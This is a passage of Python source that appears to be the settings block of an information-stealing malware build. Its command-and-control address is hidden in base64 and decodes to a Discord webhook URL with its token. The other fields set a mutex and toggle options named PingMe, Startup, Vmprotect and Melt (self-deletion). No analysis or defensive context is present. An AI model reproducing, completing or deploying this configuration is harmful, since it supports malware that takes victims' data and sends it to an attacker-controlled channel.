...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMzA4NzM2Njg4NDgyMzEwMS80enJwODZRY2dkNXJLMXFIdF83Rk5sa05nZ1RoYzJMOUtxQmVCa0NwenljYVM2UjUxem9aTXczcWktRW9SeU1JOXF1Zg==').decode())
    Mutex = base64.b64decode('blZCOW9FZjBseldFRUJEZQ==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('true')
